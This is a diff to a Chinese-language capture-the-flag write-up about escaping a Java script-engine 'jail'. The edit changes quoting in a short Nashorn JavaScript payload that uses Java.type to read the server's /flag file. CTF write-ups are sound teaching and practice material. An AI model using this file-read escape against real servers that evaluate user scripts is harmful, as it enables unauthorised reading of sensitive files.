@@ -43,11 +43,11 @@ private String calculate(String content) throws Exception {
 其实这个漏洞利用起来非常简单，无比类似于之前大家做过的 jail 题目，只是环境从 python 换到了 JAVA 而已，通过本地的尝试，我们可以给出这样一个 payload：
 
 ```js
-var Files = Java.type('java.nio.file.Files');
-var Paths = Java.type('java.nio.file.Paths');
-var Lines = Files.readAllLines(Paths.get("/flag"))
-var String = Java.type('java.lang.String');
-String.join('\n', Lines);
+var Files = Java.type("java.nio.file.Files");
+var Paths = Java.type("java.nio.file.Paths");
+var Lines = Files.readAllLines(Paths.get("/flag"));
+var String = Java.type("java.lang.String");
+String.join("\n", Lines);
 ```
 
 JAVA 中也有很多有意思的这种类型的 jail 可以出的更加有意思，期待各位未来的创造力。
